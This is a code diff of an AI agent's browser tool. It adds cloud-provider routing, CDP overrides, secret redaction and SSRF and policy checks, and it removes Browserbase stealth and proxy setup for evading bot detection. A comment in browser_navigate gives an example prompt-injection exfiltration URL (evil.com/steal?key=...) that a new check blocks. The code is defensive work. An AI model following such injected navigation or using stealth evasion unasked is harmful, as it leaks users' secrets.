@@ -66,10 +66,59 @@ from typing import Dict, Any, Optional, List
 from pathlib import Path
 from agent.auxiliary_client import call_llm
 
+try:
+    from tools.website_policy import check_website_access
+except Exception:
+    check_website_access = lambda url: None  # noqa: E731 — fail-open if policy module unavailable
+
+try:
+    from tools.url_safety import is_safe_url as _is_safe_url
+except Exception:
+    _is_safe_url = lambda url: False  # noqa: E731 — fail-closed: block all if safety module unavailable
+from tools.browser_providers.base import CloudBrowserProvider
+from tools.browser_providers.browserbase import BrowserbaseProvider
+from tools.browser_providers.browser_use import BrowserUseProvider
+from tools.tool_backend_helpers import normalize_browser_cloud_provider
+
+# Camofox local anti-detection browser backend (optional).
+# When CAMOFOX_URL is set, all browser operations route through the
+# camofox REST API instead of the agent-browser CLI.
+try:
+    from tools.browser_camofox import is_camofox_mode as _is_camofox_mode
+except ImportError:
+    _is_camofox_mode = lambda: False  # noqa: E731
+
 logger = logging.getLogger(__name__)
 
-# Standard PATH entries for environments with minimal PATH (e.g. systemd services)
-_SANE_PATH = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+# Standard PATH entries for environments with minimal PATH (e.g. systemd services).
+# Includes macOS Homebrew paths (/opt/homebrew/* for Apple Silicon).
+_SANE_PATH = (
+    "/opt/homebrew/bin:/opt/homebrew/sbin:"
+    "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+)
+
+
+def _discover_homebrew_node_dirs() -> list[str]:
+    """Find Homebrew versioned Node.js bin directories (e.g. node@20, node@24).
+
+    When Node is installed via ``brew install node@24`` and NOT linked into
+    /opt/homebrew/bin, the binary lives only in /opt/homebrew/opt/node@24/bin/.
+    This function discovers those paths so they can be added to subprocess PATH.
+    """
+    dirs: list[str] = []
+    homebrew_opt = "/opt/homebrew/opt"
+    if not os.path.isdir(homebrew_opt):
+        return dirs
+    try:
+        for entry in os.listdir(homebrew_opt):
+            if entry.startswith("node") and entry != "node":
+                # e.g. node@20, node@24
+                bin_dir = os.path.join(homebrew_opt, entry, "bin")
+                if os.path.isdir(bin_dir):
+                    dirs.append(bin_dir)
+    except OSError:
+        pass
+    return dirs
 
 # Throttle screenshot cleanup to avoid repeated full directory scans.
 _last_screenshot_cleanup_by_dir: dict[str, float] = {}
@@ -88,6 +137,27 @@ DEFAULT_SESSION_TIMEOUT = 300
 SNAPSHOT_SUMMARIZE_THRESHOLD = 8000
 
 
+def _get_command_timeout() -> int:
+    """Return the configured browser command timeout from config.yaml.
+
+    Reads ``config["browser"]["command_timeout"]`` and falls back to
+    ``DEFAULT_COMMAND_TIMEOUT`` (30s) if unset or unreadable.
+    """
+    try:
+        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        config_path = hermes_home / "config.yaml"
+        if config_path.exists():
+            import yaml
+            with open(config_path) as f:
+                cfg = yaml.safe_load(f) or {}
+            val = cfg.get("browser", {}).get("command_timeout")
+            if val is not None:
+                return max(int(val), 5)  # Floor at 5s to avoid instant kills
+    except Exception as e:
+        logger.debug("Could not read command_timeout from config: %s", e)
+    return DEFAULT_COMMAND_TIMEOUT
+
+
 def _get_vision_model() -> Optional[str]:
     """Model for browser_vision (screenshot analysis — multimodal)."""
     return os.getenv("AUXILIARY_VISION_MODEL", "").strip() or None
@@ -98,14 +168,175 @@ def _get_extraction_model() -> Optional[str]:
     return os.getenv("AUXILIARY_WEB_EXTRACT_MODEL", "").strip() or None
 
 
-def _is_local_mode() -> bool:
-    """Return True when no Browserbase credentials are configured.
+def _resolve_cdp_override(cdp_url: str) -> str:
+    """Normalize a user-supplied CDP endpoint into a concrete connectable URL.
 
-    In local mode the browser tools launch a headless Chromium instance via
-    ``agent-browser --session`` instead of connecting to a remote Browserbase
-    session via ``--cdp``.
+    Accepts:
+    - full websocket endpoints: ws://host:port/devtools/browser/...
+    - HTTP discovery endpoints: http://host:port or http://host:port/json/version
+    - bare websocket host:port values like ws://host:port
+
+    For discovery-style endpoints we fetch /json/version and return the
+    webSocketDebuggerUrl so downstream tools always receive a concrete browser
+    websocket instead of an ambiguous host:port URL.
     """
-    return not (os.environ.get("BROWSERBASE_API_KEY") and os.environ.get("BROWSERBASE_PROJECT_ID"))
+    raw = (cdp_url or "").strip()
+    if not raw:
+        return ""
+
+    lowered = raw.lower()
+    if "/devtools/browser/" in lowered:
+        return raw
+
+    discovery_url = raw
+    if lowered.startswith("ws://") or lowered.startswith("wss://"):
+        if raw.count(":") == 2 and raw.rstrip("/").rsplit(":", 1)[-1].isdigit() and "/" not in raw.split(":", 2)[-1]:
+            discovery_url = ("http://" if lowered.startswith("ws://") else "https://") + raw.split("://", 1)[1]
+        else:
+            return raw
+
+    if discovery_url.lower().endswith("/json/version"):
+        version_url = discovery_url
+    else:
+        version_url = discovery_url.rstrip("/") + "/json/version"
+
+    try:
+        response = requests.get(version_url, timeout=10)
+        response.raise_for_status()
+        payload = response.json()
+    except Exception as exc:
+        logger.warning("Failed to resolve CDP endpoint %s via %s: %s", raw, version_url, exc)
+        return raw
+
+    ws_url = str(payload.get("webSocketDebuggerUrl") or "").strip()
+    if ws_url:
+        logger.info("Resolved CDP endpoint %s -> %s", raw, ws_url)
+        return ws_url
+
+    logger.warning("CDP discovery at %s did not return webSocketDebuggerUrl; using raw endpoint", version_url)
+    return raw
+
+
+def _get_cdp_override() -> str:
+    """Return a normalized user-supplied CDP URL override, or empty string.
+
+    When ``BROWSER_CDP_URL`` is set (e.g. via ``/browser connect``), we skip
+    both Browserbase and the local headless launcher and connect directly to
+    the supplied Chrome DevTools Protocol endpoint.
+    """
+    return _resolve_cdp_override(os.environ.get("BROWSER_CDP_URL", ""))
+
+
+# ============================================================================
+# Cloud Provider Registry
+# ============================================================================
+
+_PROVIDER_REGISTRY: Dict[str, type] = {
+    "browserbase": BrowserbaseProvider,
+    "browser-use": BrowserUseProvider,
+}
+
+_cached_cloud_provider: Optional[CloudBrowserProvider] = None
+_cloud_provider_resolved = False
+_allow_private_urls_resolved = False
+_cached_allow_private_urls: Optional[bool] = None
+
+
+def _get_cloud_provider() -> Optional[CloudBrowserProvider]:
+    """Return the configured cloud browser provider, or None for local mode.
+
+    Reads ``config["browser"]["cloud_provider"]`` once and caches the result
+    for the process lifetime. An explicit ``local`` provider disables cloud
+    fallback. If unset, fall back to Browserbase when direct or managed
+    Browserbase credentials are available.
+    """
+    global _cached_cloud_provider, _cloud_provider_resolved
+    if _cloud_provider_resolved:
+        return _cached_cloud_provider
+
+    _cloud_provider_resolved = True
+    try:
+        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        config_path = hermes_home / "config.yaml"
+        if config_path.exists():
+            import yaml
+            with open(config_path) as f:
+                cfg = yaml.safe_load(f) or {}
+            browser_cfg = cfg.get("browser", {})
+            provider_key = None
+            if isinstance(browser_cfg, dict) and "cloud_provider" in browser_cfg:
+                provider_key = normalize_browser_cloud_provider(
+                    browser_cfg.get("cloud_provider")
+                )
+                if provider_key == "local":
+                    _cached_cloud_provider = None
+                    return None
+            if provider_key and provider_key in _PROVIDER_REGISTRY:
+                _cached_cloud_provider = _PROVIDER_REGISTRY[provider_key]()
+    except Exception as e:
+        logger.debug("Could not read cloud_provider from config: %s", e)
+
+    if _cached_cloud_provider is None:
+        fallback_provider = BrowserbaseProvider()
+        if fallback_provider.is_configured():
+            _cached_cloud_provider = fallback_provider
+
+    return _cached_cloud_provider
+
+
+def _get_browserbase_config_or_none() -> Optional[Dict[str, Any]]:
+    """Return Browserbase direct or managed config, or None when unavailable."""
+    return BrowserbaseProvider()._get_config_or_none()
+
+
+def _get_browserbase_config() -> Dict[str, Any]:
+    """Return Browserbase config or raise when neither direct nor managed mode is available."""
+    return BrowserbaseProvider()._get_config()
+
+
+def _is_local_mode() -> bool:
+    """Return True when the browser tool will use a local browser backend."""
+    if _get_cdp_override():
+        return False
+    return _get_cloud_provider() is None
+
+
+def _is_local_backend() -> bool:
+    """Return True when the browser runs locally (no cloud provider).
+
+    SSRF protection is only meaningful for cloud backends (Browserbase,
+    BrowserUse) where the agent could reach internal resources on a remote
+    machine.  For local backends — Camofox, or the built-in headless
+    Chromium without a cloud provider — the user already has full terminal
+    and network access on the same machine, so the check adds no security
+    value.
+    """
+    return _is_camofox_mode() or _get_cloud_provider() is None
+
+
+def _allow_private_urls() -> bool:
+    """Return whether the browser is allowed to navigate to private/internal addresses.
+
+    Reads ``config["browser"]["allow_private_urls"]`` once and caches the result
+    for the process lifetime.  Defaults to ``False`` (SSRF protection active).
+    """
+    global _cached_allow_private_urls, _allow_private_urls_resolved
+    if _allow_private_urls_resolved:
+        return _cached_allow_private_urls
+
+    _allow_private_urls_resolved = True
+    _cached_allow_private_urls = False  # safe default
+    try:
+        hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+        config_path = hermes_home / "config.yaml"
+        if config_path.exists():
+            import yaml
+            with open(config_path) as f:
+                cfg = yaml.safe_load(f) or {}
+            _cached_allow_private_urls = bool(cfg.get("browser", {}).get("allow_private_urls"))
+    except Exception as e:
+        logger.debug("Could not read allow_private_urls from config: %s", e)
+    return _cached_allow_private_urls
 
 
 def _socket_safe_tmpdir() -> str:
@@ -440,161 +671,6 @@ BROWSER_TOOL_SCHEMAS = [
 # Utility Functions
 # ============================================================================
 
-def _create_browserbase_session(task_id: str) -> Dict[str, str]:
-    """
-    Create a Browserbase session with stealth features.
-    
-    Browserbase Stealth Modes:
-    - Basic Stealth: ALWAYS enabled automatically. Generates random fingerprints,
-      viewports, and solves visual CAPTCHAs. No configuration needed.
-    - Advanced Stealth: Uses custom Chromium build for better bot detection avoidance.
-      Requires Scale Plan. Enable via BROWSERBASE_ADVANCED_STEALTH=true.
-    
-    Proxies are enabled by default to route traffic through residential IPs,
-    which significantly improves CAPTCHA solving rates. Can be disabled via
-    BROWSERBASE_PROXIES=false if needed.
-    
-    Args:
-        task_id: Unique identifier for the task
-        
-    Returns:
-        Dict with session_name, bb_session_id, cdp_url, and feature flags
-    """
-    import uuid
-    import sys
-    
-    config = _get_browserbase_config()
-    
-    # Check for optional settings from environment
-    # Proxies: enabled by default for better CAPTCHA solving
-    enable_proxies = os.environ.get("BROWSERBASE_PROXIES", "true").lower() != "false"
-    # Advanced Stealth: requires Scale Plan, disabled by default
-    enable_advanced_stealth = os.environ.get("BROWSERBASE_ADVANCED_STEALTH", "false").lower() == "true"
-    # keepAlive: enabled by default (requires paid plan) - allows reconnection after disconnects
-    enable_keep_alive = os.environ.get("BROWSERBASE_KEEP_ALIVE", "true").lower() != "false"
-    # Custom session timeout in milliseconds (optional) - extends session beyond project default
-    custom_timeout_ms = os.environ.get("BROWSERBASE_SESSION_TIMEOUT")
-    
-    # Track which features are actually enabled for logging/debugging
-    features_enabled = {
-        "basic_stealth": True,  # Always on
-        "proxies": False,
-        "advanced_stealth": False,
-        "keep_alive": False,
-        "custom_timeout": False,
-    }
-    
-    # Build session configuration
-    # Note: Basic stealth mode is ALWAYS active - no configuration needed
-    session_config = {
-        "projectId": config["project_id"],
-    }
-    
-    # Enable keepAlive for session reconnection (default: true, requires paid plan)
-    # Allows reconnecting to the same session after network hiccups
-    if enable_keep_alive:
-        session_config["keepAlive"] = True
-    
-    # Add custom timeout if specified (in milliseconds)
-    # This extends session duration beyond project's default timeout
-    if custom_timeout_ms:
-        try:
-            timeout_val = int(custom_timeout_ms)
-            if timeout_val > 0:
-                session_config["timeout"] = timeout_val
-        except ValueError:
-            logger.warning("Invalid BROWSERBASE_SESSION_TIMEOUT value: %s", custom_timeout_ms)
-    
-    # Enable proxies for better CAPTCHA solving (default: true)
-    # Routes traffic through residential IPs for more reliable access
-    if enable_proxies:
-        session_config["proxies"] = True
-    
-    # Add advanced stealth if enabled (requires Scale Plan)
-    # Uses custom Chromium build to avoid bot detection altogether
-    if enable_advanced_stealth:
-        session_config["browserSettings"] = {
-            "advancedStealth": True,
-        }
-    
-    # Create session via Browserbase API
-    response = requests.post(
-        "https://api.browserbase.com/v1/sessions",
-        headers={
-            "Content-Type": "application/json",
-            "X-BB-API-Key": config["api_key"],
-        },
-        json=session_config,
-        timeout=30
-    )
-    
-    # Track if we fell back from paid features
-    proxies_fallback = False
-    keepalive_fallback = False
-    
-    # Handle 402 Payment Required - likely paid features not available
-    # Try to identify which feature caused the issue and retry without it
-    if response.status_code == 402:
-        # First try without keepAlive (most likely culprit for paid plan requirement)
-        if enable_keep_alive:
-            keepalive_fallback = True
-            logger.warning("keepAlive may require paid plan (402), retrying without it. "
-                          "Sessions may timeout during long operations.")
-            session_config.pop("keepAlive", None)
-            response = requests.post(
-                "https://api.browserbase.com/v1/sessions",
-                headers={
-                    "Content-Type": "application/json",
-                    "X-BB-API-Key": config["api_key"],
-                },
-                json=session_config,
-                timeout=30
-            )
-        
-        # If still 402, try without proxies too
-        if response.status_code == 402 and enable_proxies:
-            proxies_fallback = True
-            logger.warning("Proxies unavailable (402), retrying without proxies. "
-                          "Bot detection may be less effective.")
-            session_config.pop("proxies", None)
-            response = requests.post(
-                "https://api.browserbase.com/v1/sessions",
-                headers={
-                    "Content-Type": "application/json",
-                    "X-BB-API-Key": config["api_key"],
-                },
-                json=session_config,
-                timeout=30
-            )
-    
-    if not response.ok:
-        raise RuntimeError(f"Failed to create Browserbase session: {response.status_code} {response.text}")
-    
-    session_data = response.json()
-    session_name = f"hermes_{task_id}_{uuid.uuid4().hex[:8]}"
-    
-    # Update features based on what actually succeeded
-    if enable_proxies and not proxies_fallback:
-        features_enabled["proxies"] = True
-    if enable_advanced_stealth:
-        features_enabled["advanced_stealth"] = True
-    if enable_keep_alive and not keepalive_fallback:
-        features_enabled["keep_alive"] = True
-    if custom_timeout_ms and "timeout" in session_config:
-        features_enabled["custom_timeout"] = True
-    
-    # Log session info for debugging
-    feature_str = ", ".join(k for k, v in features_enabled.items() if v)
-    logger.info("Created session %s with features: %s", session_name, feature_str)
-    
-    return {
-        "session_name": session_name,
-        "bb_session_id": session_data["id"],
-        "cdp_url": session_data["connectUrl"],
-        "features": features_enabled,
-    }
-
-
 def _create_local_session(task_id: str) -> Dict[str, str]:
     import uuid
     session_name = f"h_{uuid.uuid4().hex[:10]}"
@@ -605,6 +681,20 @@ def _create_local_session(task_id: str) -> Dict[str, str]:
         "bb_session_id": None,
         "cdp_url": None,
         "features": {"local": True},
+    }
+
+
+def _create_cdp_session(task_id: str, cdp_url: str) -> Dict[str, str]:
+    """Create a session that connects to a user-supplied CDP endpoint."""
+    import uuid
+    session_name = f"cdp_{uuid.uuid4().hex[:10]}"
+    logger.info("Created CDP browser session %s → %s for task %s",
+                session_name, cdp_url, task_id)
+    return {
+        "session_name": session_name,
+        "bb_session_id": None,
+        "cdp_url": cdp_url,
+        "features": {"cdp_override": True},
     }
 
 
@@ -638,61 +728,34 @@ def _get_session_info(task_id: Optional[str] = None) -> Dict[str, str]:
             return _active_sessions[task_id]
     
     # Create session outside the lock (network call in cloud mode)
-    if _is_local_mode():
-        session_info = _create_local_session(task_id)
+    cdp_override = _get_cdp_override()
+    if cdp_override:
+        session_info = _create_cdp_session(task_id, cdp_override)
     else:
-        session_info = _create_browserbase_session(task_id)
+        provider = _get_cloud_provider()
+        if provider is None:
+            session_info = _create_local_session(task_id)
+        else:
+            session_info = provider.create_session(task_id)
     
     with _cleanup_lock:
+        # Double-check: another thread may have created a session while we
+        # were doing the network call. Use the existing one to avoid leaking
+        # orphan cloud sessions.
+        if task_id in _active_sessions:
+            return _active_sessions[task_id]
         _active_sessions[task_id] = session_info
     
     return session_info
 
-
-def _get_session_name(task_id: Optional[str] = None) -> str:
-    """
-    Get the session name for agent-browser CLI.
-    
-    Args:
-        task_id: Unique identifier for the task
-        
-    Returns:
-        Session name for agent-browser
-    """
-    session_info = _get_session_info(task_id)
-    return session_info["session_name"]
-
-
-def _get_browserbase_config() -> Dict[str, str]:
-    """
-    Get Browserbase configuration from environment.
-    
-    Returns:
-        Dict with api_key and project_id
-        
-    Raises:
-        ValueError: If required env vars are not set
-    """
-    api_key = os.environ.get("BROWSERBASE_API_KEY")
-    project_id = os.environ.get("BROWSERBASE_PROJECT_ID")
-    
-    if not api_key or not project_id:
-        raise ValueError(
-            "BROWSERBASE_API_KEY and BROWSERBASE_PROJECT_ID environment variables are required. "
-            "Get your credentials at https://browserbase.com"
-        )
-    
-    return {
-        "api_key": api_key,
-        "project_id": project_id
-    }
 
 
 def _find_agent_browser() -> str:
     """
     Find the agent-browser CLI executable.
     
-    Checks in order: PATH, local node_modules/.bin/, npx fallback.
+    Checks in order: current PATH, Homebrew/common bin dirs, Hermes-managed
+    node, local node_modules/.bin/, npx fallback.
     
     Returns:
         Path to agent-browser executable
@@ -705,15 +768,36 @@ def _find_agent_browser() -> str:
     which_result = shutil.which("agent-browser")
     if which_result:
         return which_result
-    
+
+    # Build an extended search PATH including Homebrew and Hermes-managed dirs.
+    # This covers macOS where the process PATH may not include Homebrew paths.
+    extra_dirs: list[str] = []
+    for d in ["/opt/homebrew/bin", "/usr/local/bin"]:
+        if os.path.isdir(d):
+            extra_dirs.append(d)
+    extra_dirs.extend(_discover_homebrew_node_dirs())
+
+    hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
+    hermes_node_bin = str(hermes_home / "node" / "bin")
+    if os.path.isdir(hermes_node_bin):
+        extra_dirs.append(hermes_node_bin)
+
+    if extra_dirs:
+        extended_path = os.pathsep.join(extra_dirs)
+        which_result = shutil.which("agent-browser", path=extended_path)
+        if which_result:
+            return which_result
+
     # Check local node_modules/.bin/ (npm install in repo root)
     repo_root = Path(__file__).parent.parent
     local_bin = repo_root / "node_modules" / ".bin" / "agent-browser"
     if local_bin.exists():
         return str(local_bin)
     
-    # Check common npx locations
+    # Check common npx locations (also search extended dirs)
     npx_path = shutil.which("npx")
+    if not npx_path and extra_dirs:
+        npx_path = shutil.which("npx", path=os.pathsep.join(extra_dirs))
     if npx_path:
         return "npx agent-browser"
     
@@ -749,7 +833,7 @@ def _run_browser_command(
     task_id: str,
     command: str,
     args: List[str] = None,
-    timeout: int = DEFAULT_COMMAND_TIMEOUT
+    timeout: Optional[int] = None,
 ) -> Dict[str, Any]:
     """
     Run an agent-browser CLI command using our pre-created Browserbase session.
@@ -758,11 +842,14 @@ def _run_browser_command(
         task_id: Task identifier to get the right session
         command: The command to run (e.g., "open", "click")
         args: Additional arguments for the command
-        timeout: Command timeout in seconds
+        timeout: Command timeout in seconds.  ``None`` reads
+                 ``browser.command_timeout`` from config (default 30s).
         
     Returns:
         Parsed JSON response from agent-browser
     """
+    if timeout is None:
+        timeout = _get_command_timeout()
     args = args or []
     
     # Build the command
@@ -815,13 +902,18 @@ def _run_browser_command(
         
         browser_env = {**os.environ}
 
-        # Ensure PATH includes Hermes-managed Node first, then standard system dirs.
+        # Ensure PATH includes Hermes-managed Node first, Homebrew versioned
+        # node dirs (for macOS ``brew install node@24``), then standard system dirs.
         hermes_home = Path(os.environ.get("HERMES_HOME", Path.home() / ".hermes"))
         hermes_node_bin = str(hermes_home / "node" / "bin")
 
         existing_path = browser_env.get("PATH", "")
         path_parts = [p for p in existing_path.split(":") if p]
-        candidate_dirs = [hermes_node_bin] + [p for p in _SANE_PATH.split(":") if p]
+        candidate_dirs = (
+            [hermes_node_bin]
+            + _discover_homebrew_node_dirs()
+            + [p for p in _SANE_PATH.split(":") if p]
+        )
 
         for part in reversed(candidate_dirs):
             if os.path.isdir(part) and part not in path_parts:
@@ -830,27 +922,62 @@ def _run_browser_command(
         browser_env["PATH"] = ":".join(path_parts)
         browser_env["AGENT_BROWSER_SOCKET_DIR"] = task_socket_dir
         
-        result = subprocess.run(
-            cmd_parts,
-            capture_output=True,
-            text=True,
-            timeout=timeout,
-            env=browser_env,
-        )
-        
+        # Use temp files for stdout/stderr instead of pipes.
+        # agent-browser starts a background daemon that inherits file
+        # descriptors.  With capture_output=True (pipes), the daemon keeps
+        # the pipe fds open after the CLI exits, so communicate() never
+        # sees EOF and blocks until the timeout fires.
+        stdout_path = os.path.join(task_socket_dir, f"_stdout_{command}")
+        stderr_path = os.path.join(task_socket_dir, f"_stderr_{command}")
+        stdout_fd = os.open(stdout_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+        stderr_fd = os.open(stderr_path, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+        try:
+            proc = subprocess.Popen(
+                cmd_parts,
+                stdout=stdout_fd,
+                stderr=stderr_fd,
+                stdin=subprocess.DEVNULL,
+                env=browser_env,
+            )
+        finally:
+            os.close(stdout_fd)
+            os.close(stderr_fd)
+
+        try:
+            proc.wait(timeout=timeout)
+        except subprocess.TimeoutExpired:
+            proc.kill()
+            proc.wait()
+            logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
+                           command, timeout, task_id, task_socket_dir)
+            return {"success": False, "error": f"Command timed out after {timeout} seconds"}
+
+        with open(stdout_path, "r") as f:
+            stdout = f.read()
+        with open(stderr_path, "r") as f:
+            stderr = f.read()
+        returncode = proc.returncode
+
+        # Clean up temp files (best-effort)
+        for p in (stdout_path, stderr_path):
+            try:
+                os.unlink(p)
+            except OSError:
+                pass
+
         # Log stderr for diagnostics — use warning level on failure so it's visible
-        if result.stderr and result.stderr.strip():
-            level = logging.WARNING if result.returncode != 0 else logging.DEBUG
-            logger.log(level, "browser '%s' stderr: %s", command, result.stderr.strip()[:500])
+        if stderr and stderr.strip():
+            level = logging.WARNING if returncode != 0 else logging.DEBUG
+            logger.log(level, "browser '%s' stderr: %s", command, stderr.strip()[:500])
         
         # Log empty output as warning — common sign of broken agent-browser
-        if not result.stdout.strip() and result.returncode == 0:
+        if not stdout.strip() and returncode == 0:
             logger.warning("browser '%s' returned empty stdout with rc=0. "
                            "cmd=%s stderr=%s",
                            command, " ".join(cmd_parts[:4]) + "...",
-                           (result.stderr or "")[:200])
+                           (stderr or "")[:200])
 
-        stdout_text = result.stdout.strip()
+        stdout_text = stdout.strip()
 
         if stdout_text:
             try:
@@ -861,15 +988,15 @@ def _run_browser_command(
                     if not snap_data.get("snapshot") and not snap_data.get("refs"):
                         logger.warning("snapshot returned empty content. "
                                        "Possible stale daemon or CDP connection issue. "
-                                       "returncode=%s", result.returncode)
+                                       "returncode=%s", returncode)
                 return parsed
             except json.JSONDecodeError:
                 raw = stdout_text[:2000]
                 logger.warning("browser '%s' returned non-JSON output (rc=%s): %s",
-                               command, result.returncode, raw[:500])
+                               command, returncode, raw[:500])
 
                 if command == "screenshot":
-                    stderr_text = (result.stderr or "").strip()
+                    stderr_text = (stderr or "").strip()
                     combined_text = "\n".join(
                         part for part in [stdout_text, stderr_text] if part
                     )
@@ -894,17 +1021,13 @@ def _run_browser_command(
                 }
         
         # Check for errors
-        if result.returncode != 0:
-            error_msg = result.stderr.strip() if result.stderr else f"Command failed with code {result.returncode}"
-            logger.warning("browser '%s' failed (rc=%s): %s", command, result.returncode, error_msg[:300])
+        if returncode != 0:
+            error_msg = stderr.strip() if stderr else f"Command failed with code {returncode}"
+            logger.warning("browser '%s' failed (rc=%s): %s", command, returncode, error_msg[:300])
             return {"success": False, "error": error_msg}
         
         return {"success": True, "data": {}}
         
-    except subprocess.TimeoutExpired:
-        logger.warning("browser '%s' timed out after %ds (task=%s, socket_dir=%s)",
-                       command, timeout, task_id, task_socket_dir)
-        return {"success": False, "error": f"Command timed out after {timeout} seconds"}
     except Exception as e:
         logger.warning("browser '%s' exception: %s", command, e, exc_info=True)
         return {"success": False, "error": str(e)}
@@ -941,6 +1064,13 @@ def _extract_relevant_content(
             f"Provide a concise summary focused on interactive elements and key content."
         )
 
+    # Redact secrets from snapshot before sending to auxiliary LLM.
+    # Without this, a page displaying env vars or API keys would leak
+    # secrets to the extraction model before run_agent.py's general
+    # redaction layer ever sees the tool result.
+    from agent.redact import redact_sensitive_text
+    extraction_prompt = redact_sensitive_text(extraction_prompt)
+
     try:
         call_kwargs = {
             "task": "web_extract",
@@ -952,7 +1082,9 @@ def _extract_relevant_content(
         if model:
             call_kwargs["model"] = model
         response = call_llm(**call_kwargs)
-        return response.choices[0].message.content
+        extracted = (response.choices[0].message.content or "").strip() or _truncate_snapshot(snapshot_text)
+        # Redact any secrets the auxiliary LLM may have echoed back.
+        return redact_sensitive_text(extracted)
     except Exception:
         return _truncate_snapshot(snapshot_text)
 
@@ -989,6 +1121,42 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result (includes stealth features info on first nav)
     """
+    # Secret exfiltration protection — block URLs that embed API keys or
+    # tokens in query parameters. A prompt injection could trick the agent
+    # into navigating to https://evil.com/steal?key=sk-ant-... to exfil secrets.
+    from agent.redact import _PREFIX_RE
+    if _PREFIX_RE.search(url):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL contains what appears to be an API key or token. "
+                     "Secrets must not be sent in URLs.",
+        })
+
+    # SSRF protection — block private/internal addresses before navigating.
+    # Skipped for local backends (Camofox, headless Chromium without a cloud
+    # provider) because the agent already has full local network access via
+    # the terminal tool.  Can also be opted out for cloud mode via
+    # ``browser.allow_private_urls`` in config.
+    if not _is_local_backend() and not _allow_private_urls() and not _is_safe_url(url):
+        return json.dumps({
+            "success": False,
+            "error": "Blocked: URL targets a private or internal address",
+        })
+
+    # Website policy check — block before navigating
+    blocked = check_website_access(url)
+    if blocked:
+        return json.dumps({
+            "success": False,
+            "error": blocked["message"],
+            "blocked_by_policy": {"host": blocked["host"], "rule": blocked["rule"], "source": blocked["source"]},
+        })
+
+    # Camofox backend — delegate after safety checks pass
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_navigate
+        return camofox_navigate(url, task_id)
+
     effective_task_id = task_id or "default"
     
     # Get session info to check if this is a new session
@@ -1001,13 +1169,25 @@ def browser_navigate(url: str, task_id: Optional[str] = None) -> str:
         session_info["_first_nav"] = False
         _maybe_start_recording(effective_task_id)
     
-    result = _run_browser_command(effective_task_id, "open", [url], timeout=60)
+    result = _run_browser_command(effective_task_id, "open", [url], timeout=max(_get_command_timeout(), 60))
     
     if result.get("success"):
         data = result.get("data", {})
         title = data.get("title", "")
         final_url = data.get("url", url)
-        
+
+        # Post-redirect SSRF check — if the browser followed a redirect to a
+        # private/internal address, block the result so the model can't read
+        # internal content via subsequent browser_snapshot calls.
+        # Skipped for local backends (same rationale as the pre-nav check).
+        if not _is_local_backend() and not _allow_private_urls() and final_url and final_url != url and not _is_safe_url(final_url):
+            # Navigate away to a blank page to prevent snapshot leaks
+            _run_browser_command(effective_task_id, "open", ["about:blank"], timeout=10)
+            return json.dumps({
+                "success": False,
+                "error": "Blocked: redirect landed on a private/internal address",
+            })
+
         response = {
             "success": True,
             "url": final_url,
@@ -1067,6 +1247,10 @@ def browser_snapshot(
     Returns:
         JSON string with page snapshot
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_snapshot
+        return camofox_snapshot(full, task_id, user_task)
+
     effective_task_id = task_id or "default"
     
     # Build command args based on full flag
@@ -1112,6 +1296,10 @@ def browser_click(ref: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with click result
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_click
+        return camofox_click(ref, task_id)
+
     effective_task_id = task_id or "default"
     
     # Ensure ref starts with @
@@ -1144,6 +1332,10 @@ def browser_type(ref: str, text: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with type result
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_type
+        return camofox_type(ref, text, task_id)
+
     effective_task_id = task_id or "default"
     
     # Ensure ref starts with @
@@ -1177,6 +1369,10 @@ def browser_scroll(direction: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with scroll result
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_scroll
+        return camofox_scroll(direction, task_id)
+
     effective_task_id = task_id or "default"
     
     # Validate direction
@@ -1210,6 +1406,10 @@ def browser_back(task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with navigation result
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_back
+        return camofox_back(task_id)
+
     effective_task_id = task_id or "default"
     result = _run_browser_command(effective_task_id, "back", [])
     
@@ -1237,6 +1437,10 @@ def browser_press(key: str, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with key press result
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_press
+        return camofox_press(key, task_id)
+
     effective_task_id = task_id or "default"
     result = _run_browser_command(effective_task_id, "press", [key])
     
@@ -1262,6 +1466,10 @@ def browser_close(task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with close result
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_close
+        return camofox_close(task_id)
+
     effective_task_id = task_id or "default"
     with _cleanup_lock:
         had_session = effective_task_id in _active_sessions
@@ -1290,6 +1498,10 @@ def browser_console(clear: bool = False, task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with console messages and JS errors
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_console
+        return camofox_console(clear, task_id)
+
     effective_task_id = task_id or "default"
     
     console_args = ["--clear"] if clear else []
@@ -1384,6 +1596,10 @@ def browser_get_images(task_id: Optional[str] = None) -> str:
     Returns:
         JSON string with list of images (src and alt)
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_get_images
+        return camofox_get_images(task_id)
+
     effective_task_id = task_id or "default"
     
     # Use eval to run JavaScript that extracts images
@@ -1448,6 +1664,10 @@ def browser_vision(question: str, annotate: bool = False, task_id: Optional[str]
     Returns:
         JSON string with vision analysis results and screenshot_path
     """
+    if _is_camofox_mode():
+        from tools.browser_camofox import camofox_vision
